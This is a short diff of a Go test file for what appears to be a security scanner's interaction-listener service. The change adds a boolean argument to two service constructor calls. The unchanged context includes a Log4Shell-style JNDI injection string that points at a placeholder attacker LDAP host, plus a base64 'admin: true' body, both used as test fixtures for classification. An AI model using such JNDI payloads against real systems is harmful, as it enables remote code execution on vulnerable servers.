@@ -4760,7 +4760,7 @@ func TestV2CreateInteractionWithEnrichment(t *testing.T) {
 	encodedBody := "eyJhZG1pbiI6InRydWUifQ==" // base64 of {"admin":"true"}
 
 	// Create interaction via the service (simulating what happens when a listener receives a request)
-	iaSvc := interaction.NewService(srv.orm, nil, nil)
+	iaSvc := interaction.NewService(srv.orm, nil, nil, false)
 	now := time.Now()
 	interaction := &v2models.Interaction{
 		ID:        "enrich-test-1",
@@ -4789,7 +4789,7 @@ func TestV2CreateInteractionWithClassification(t *testing.T) {
 	gin.SetMode(gin.TestMode)
 	srv, _, _ := setupV2ScannerHubAPITest(t)
 
-	iaSvc := interaction.NewService(srv.orm, nil, nil)
+	iaSvc := interaction.NewService(srv.orm, nil, nil, false)
 	now := time.Now()
 	tokenStr := "test-classify-token"
 	domain := "${jndi:ldap://evil.test123.dnslog.fun}"
